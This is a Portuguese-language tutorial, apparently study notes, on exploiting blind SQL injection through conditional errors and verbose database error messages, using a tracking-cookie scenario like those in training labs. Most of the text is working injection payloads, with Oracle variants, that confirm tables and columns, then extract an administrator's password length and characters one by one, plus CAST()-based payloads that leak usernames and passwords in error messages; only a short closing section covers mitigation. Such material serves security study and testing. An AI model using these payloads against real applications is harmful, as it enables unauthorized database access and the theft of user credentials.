# Explorando Blind SQL Injection através de Erros Condicionais

Blind SQL Injection (SQLi Cega) pode ser explorado em situações onde a aplicação não retorna diretamente os resultados da consulta SQL injetada, mas apresenta um comportamento diferente com base nas condições que a consulta encontra. Esta técnica permite que um atacante extraia informações sensíveis ao manipular as respostas da aplicação a partir de condições SQL injetadas.

### Exemplo de Exploração

Considere uma aplicação que utiliza cookies de rastreamento para coletar dados analíticos sobre o uso dos usuários. Os pedidos enviados para a aplicação incluem um cabeçalho de cookie, como o exemplo abaixo:

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Quando um pedido contendo o cookie `TrackingId` é processado, a aplicação utiliza a seguinte consulta SQL para verificar se o usuário é conhecido:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta é vulnerável a SQL Injection, mas os resultados da consulta não são retornados ao usuário. No entanto, a aplicação lança erros dependendo da consulta realizada. 

Esse comportamento permite que a vulnerabilidade de Blind SQL Injection seja explorada ao condicionar o lançamento de erros da aplicação com base em uma condição injetada.

### Como a Exploração Funciona

Para entender como essa exploração funciona, considere dois pedidos enviados à aplicação com os seguintes valores para o cookie `TrackingId`:

1. `…xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
2. `…xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

- **Primeiro valor:** A condição injetada 1=2 é falsa, então a consulta retorna resultados normalmente sem lançar nenhum erro.
- **Segundo valor:** A condição injetada 1=1 é verdadeira, então a consulta lança um erro ao tentar dividir 1 por 0.

*A forma de lançar erros difere em cada banco de dados. Em bancos de dados oracle, por exemplo, é necessário utilizar `TO_CHAR(1/0)`. Para mais informações consultar o [SQLi Cheatsheet](SQLi%20Cheatsheet.md)

Esse padrão de respostas permite determinar a verdade de qualquer condição injetada, e possibilita a extração de dados, um pedaço por vez.

### Exemplo de Extração de Dados

Vamos supor que existe uma tabela chamada `Users` com as colunas `Username` e `Password`, e um usuário chamado `Administrator`. É possível determinar a senha desse usuário enviando uma série de entradas para testar cada caractere da senha, um por vez.

**Passo 1:** Primeiramente valide se uma tabela `Users` existe:

```sql
xyz' AND (SELECT 'a' FROM Users LIMIT 1)='a
```

Em bancos de dados Oracle:

```sql
xyz' AND (SELECT 'a' FROM Users WHERE ROWNUM = 1)='a
```

Ou,

```sql
xyz'||(SELECT '' FROM Users WHERE ROWNUM = 1)||'
```

Caso nenhum erro for exibido, isso indica que a tabela `Users` existe.

**Passo 2:** Em seguida valide se as colunas `Username` e `Password` existem na tabela `Users`.

```sql
xyz' AND (SELECT 'a' FROM Users WHERE Username IS NOT NULL AND ROWNUM = 1)='a
```

Caso nenhum erro for exibido, isso indica que a coluna `Username` existe.


**Passo 3:** Em seguida valide se o usuário `Administrator` existe na tabela:

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END FROM Users WHERE Username='Administrator')='a
```

Em bancos de dados Oracle:

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM Users WHERE Username='Administrator')='a
```

Ou,

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM Users WHERE Username='Administrator')||'
```

Caso um erro for exibido significa que usuário `Administrator` existe na tabela `Users`.


**Passo 4:** Em seguida descubra o tamanho da senha do usuário `Administrador`:

```sql
xyz' AND (SELECT CASE WHEN LENGTH(Password)=10 THEN TO_CHAR(1/0) ELSE 'a' END FROM Users WHERE Username='Administrator')='a
```

Ou, 

```sql
'||(SELECT CASE WHEN LENGTH(Password)=10 THEN TO_CHAR(1/0) ELSE '' END FROM Users WHERE Username='Administrator')||'
```

Caso um erro for exibido, isso indica que a condição `LENGTH(Password)=10` é verdadeira. Altere a condição até encontrar o comprimento da senha.


**Passo 5:** Descubra o primeiro caractere da senha:

```sql
xyz' AND (SELECT CASE WHEN SUBSTR(Password,1,1)='x' THEN TO_CHAR(1/0) ELSE 'a' END FROM Users WHERE Username='Administrator')='a
```

Ou,

```sql
'||(SELECT CASE WHEN SUBSTR(Password,1,1)='x' THEN TO_CHAR(1/0) ELSE '' END FROM Users WHERE Username='Administrator')||'
```

Caso um erro for exibido, isso indica que a condição injetada é verdadeira e, portanto, o primeiro caractere da senha é x. Altere a condição até encontrar o caractere exato da senha.

**Passo 6:** Repita o processo até encontrar todos os caracteres da senha:

```sql
xyz' AND (SELECT CASE WHEN SUBSTR(Password,2,1)='x' THEN TO_CHAR(1/0) ELSE 'a' END FROM Users WHERE Username='Administrator')='a
```

## Extração de Informações Sensíveis a Partir de Erros SQL Verbosos

Quando mal configurado, um banco de dados pode fornecer mensagens de erro detalhadas que revelam informações valiosas para um atacante. A seguir, discutimos como identificar essas vulnerabilidades e como explorá-las para extrair dados sensíveis.

### **Identificando Mensagens de Erro Verbosas**
   
   - Quando um banco de dados é mal configurado, ele pode retornar mensagens de erro que contêm detalhes sobre a consulta SQL executada.
   
   - Um exemplo disso ocorre quando um `'` (apóstrofo) é injetado em um parâmetro de ID, resultando em uma mensagem de erro que revela a estrutura da consulta SQL, facilitando o planejamento de um ataque mais eficaz.

### **Análise e Exploração de Erros Verbosos**
   
   - **Entendendo a Mensagem de Erro**: 
     - Suponha que a aplicação retorne uma mensagem de erro como a seguinte ao injetar um apóstrofo:
       
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```
     
     - Isso indica que estamos injetando em uma string entre aspas simples dentro de uma cláusula WHERE, permitindo a manipulação da consulta.

   - **Comentando o Restante da Consulta**:
     
     - Para explorar essa vulnerabilidade, podemos comentar o restante da consulta SQL para evitar erros de sintaxe.
     
     - Exemplo:

       ```
       TrackingId=ogAZZfxtOKUELbuJ'--
       ```

     - Isso impede que a consulta seja corrompida pelo apóstrofo adicional.

### **Explorando Dados Sensíveis com CAST()**
   
   - **Usando CAST() para Expor Dados**:
   
     - A função `CAST()` pode ser usada para forçar a conversão de dados, induzindo erros que podem expor informações sensíveis.
   
     - Exemplo:
   
```
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT "a") AS int)--
```
   
     - Se a conversão falhar devido à incompatibilidade de tipos, como tentar converter uma string em um inteiro, uma mensagem de erro pode revelar os dados que você deseja acessar.

   - **Acessando Dados Específicos**:
     
     - Para acessar informações como nomes de usuários, a consulta pode ser adaptada:
     
```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

### **Superando Limitações de Caracteres**
   
   - **Ajustando Consultas para Limites de Caracteres**:
   
     - Em alguns casos, há um limite no número de caracteres que podem ser usados na consulta, o que pode truncar o comentário ou outra parte da injeção.
   
     - Solução:
   
```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
   
     - Isso libera espaço para a injeção e permite que a consulta seja executada corretamente.

### **Extraindo Senhas ou Outros Dados Críticos**
   
   - **Modificando a Consulta para Extrair Senhas**:
   
     - Após obter o nome de usuário, a mesma técnica pode ser usada para extrair a senha do administrador ou de outro usuário:
   
```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
   
     - A senha extraída pode então ser usada para acessar o sistema.

### **Considerações Finais**

   - **Mitigação**:

     - Para evitar essa exploração, as aplicações devem ser configuradas para retornar mensagens de erro genéricas, sem revelar detalhes sobre as consultas SQL subjacentes.
   
     - Além disso, é crucial validar e sanitizar adequadamente todos os dados de entrada para evitar injeções SQL.

